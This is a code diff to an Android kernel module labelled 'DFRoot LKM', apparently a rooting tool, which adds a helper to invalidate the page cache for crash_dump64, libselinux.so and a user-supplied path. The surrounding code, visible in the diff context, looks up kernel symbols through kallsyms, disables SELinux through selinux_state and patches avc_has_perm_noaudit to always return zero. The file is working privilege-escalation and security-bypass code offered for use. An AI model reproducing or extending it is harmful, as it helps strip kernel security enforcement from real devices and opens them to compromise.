@@ -7,6 +7,9 @@
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("DFRoot LKM");
 
+static char ko_target[64];
+module_param_string(ko_target, ko_target, sizeof(ko_target), 0);
+
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 typedef unsigned long (*module_kallsyms_lookup_name_t)(const char *name);
 typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
@@ -18,6 +21,21 @@ typedef void (*path_put_t)(const struct path *);
 typedef int  (*insn_patch_t)(void *addrs[], u32 insns[], int cnt);
 
 static insn_patch_t insn_patch_text;
+
+static __nocfi void drop_page_cache(kern_path_t kern_path_fn,
+                                    invalidate_t invalidate_fn,
+                                    path_put_t path_put_fn,
+                                    const char *path)
+{
+    struct path p;
+    if (kern_path_fn(path, LOOKUP_FOLLOW, &p)) {
+        pr_err("dfroot: kern_path failed for %s\n", path);
+        return;
+    }
+    invalidate_fn(p.dentry->d_inode->i_mapping);
+    path_put_fn(&p);
+    pr_info("dfroot: cleared page cache for %s\n", path);
+}
 
 static __nocfi void patch_fn_ret_zero(void *fn)
 {
@@ -42,7 +60,6 @@ static int __nocfi __init dfroot_init(void)
     kern_path_t  kern_path_fn;
     invalidate_t invalidate_fn;
     path_put_t   path_put_fn;
-    struct path  p;
     umh_setup_t umh_setup;
     umh_exec_t  umh_exec;
     bool *selinux_state;
@@ -83,16 +100,8 @@ static int __nocfi __init dfroot_init(void)
     kern_path_fn  = (kern_path_t) get_addr("kern_path");
     invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
     path_put_fn   = (path_put_t)  get_addr("path_put");
-    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
+    if (!kern_path_fn || !invalidate_fn || !path_put_fn)
         pr_err("dfroot: cache drop symbols missing\n");
-    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
-                            LOOKUP_FOLLOW, &p)) {
-        pr_err("dfroot: kern_path failed for crash_dump64\n");
-    } else {
-        invalidate_fn(p.dentry->d_inode->i_mapping);
-        path_put_fn(&p);
-        pr_info("dfroot: cleared page cache for crash_dump64\n");
-    }
 
     // Disable SELinux
     selinux_state = (bool *)get_addr("selinux_state");
@@ -122,6 +131,15 @@ static int __nocfi __init dfroot_init(void)
             patch_fn_ret_zero(avc_noaudit_fn);
             pr_info("dfroot: avc_has_perm_noaudit patched\n");
         }
+    }
+
+    if (kern_path_fn && invalidate_fn && path_put_fn) {
+        drop_page_cache(kern_path_fn, invalidate_fn, path_put_fn,
+                        "/apex/com.android.runtime/bin/crash_dump64");
+        drop_page_cache(kern_path_fn, invalidate_fn, path_put_fn,
+                        "/system/lib64/libselinux.so");
+        if (ko_target[0])
+            drop_page_cache(kern_path_fn, invalidate_fn, path_put_fn, ko_target);
     }
 
     // Oppo/OnePlus
